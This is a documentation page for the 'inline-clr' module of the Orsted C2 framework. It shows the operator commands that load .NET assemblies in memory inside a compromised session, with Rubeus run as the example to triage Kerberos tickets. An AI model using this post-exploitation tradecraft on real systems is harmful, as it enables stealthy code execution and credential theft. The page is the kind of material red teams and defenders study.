---

title: inline-clr
descripton: orsted c2 inline-clr
---

### General

`inline-clr` allows you to load and run dotnet assembly in-process

```
[Session 9: haroun@DESKTOP-DU89UIV] » inline-clr --help

Load and Execute NET Assembly in Memory

Usage:
  inline-clr [flags]

Flags:
  -h, --help     display help

Sub Commands:
  invoke-assembly  Invoke Assembly in CLR
  list-assemblies  List Assembly loaded in CLR
  load-assembly    Load Assmebly in CLR
  start-clr        Load CLR v4
```

It requires you to load the `inline-clr` dll with `load-module inline-clr`

PS: `inline-clr` has ZERO evasion capabilites. Evasion is handled by the `evasion` module.

### start-clr

Before doing anything with `inline-clr` you need to start the clr.

This can be done using

```powershell
[Session 9: haroun@DESKTOP-DU89UIV] » inline-clr start-clr
```

### load-assembly

After loading the CLR, you can load assemblies.

```powershell
[Session 9: haroun@DESKTOP-DU89UIV] » inline-clr load-assembly Rubeus.exe
```
The Path to look for dotnet is defined in `./data/clientconf.toml`

```toml
...
NetAssemblyPath = "./tools/windows/dotnet/"
...
```


### list-assemblies

You can list all the assemblies loaded using

```powershell
[Session 9: haroun@DESKTOP-DU89UIV] » inline-clr list-assemblies
```

The result will be something like

```
[Session 9: haroun@DESKTOP-DU89UIV] »
 >>> incline-clr list-assemblies
 <<<
STDOUT --->
Task Register Successufully
STDERR --->


 >>> incline-clr list-assemblies
 <<< Loaded Assemblies are:
----------------------
rubeus.exe
```

### invoke-assembly

Finally you can `invoke-assembly` with arguments

```powershell
[Session 9: haroun@DESKTOP-DU89UIV] » inline-clr invoke-assembly rubeus.exe triage
```

The output will be something like

```
[Session 9: haroun@DESKTOP-DU89UIV] » inline-clr invoke-assembly rubeus.exe triage
+--------+-----------+---------+--------------------------------+
| TASKID | SESSIONID |  STATE  |            COMMAND             |
+--------+-----------+---------+--------------------------------+
|    100 |         9 | pending | inline-clr invoke-assembly     |
|        |           |         | rubeus.exe triage              |
+--------+-----------+---------+--------------------------------+
[Session 9: haroun@DESKTOP-DU89UIV] »
 >>> inline-clr invoke-assembly rubeus.exe triage
 <<<
STDOUT --->
Task Register Successufully
STDERR --->


 >>> inline-clr invoke-assembly rubeus.exe triage
 <<<
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2


Action: Triage Kerberos Tickets (Current User)

[*] Current LUID    : 0x598b2

 ---------------------------------------
 | LUID | UserName | Service | EndTime |
 ---------------------------------------
 ---------------------------------------


```

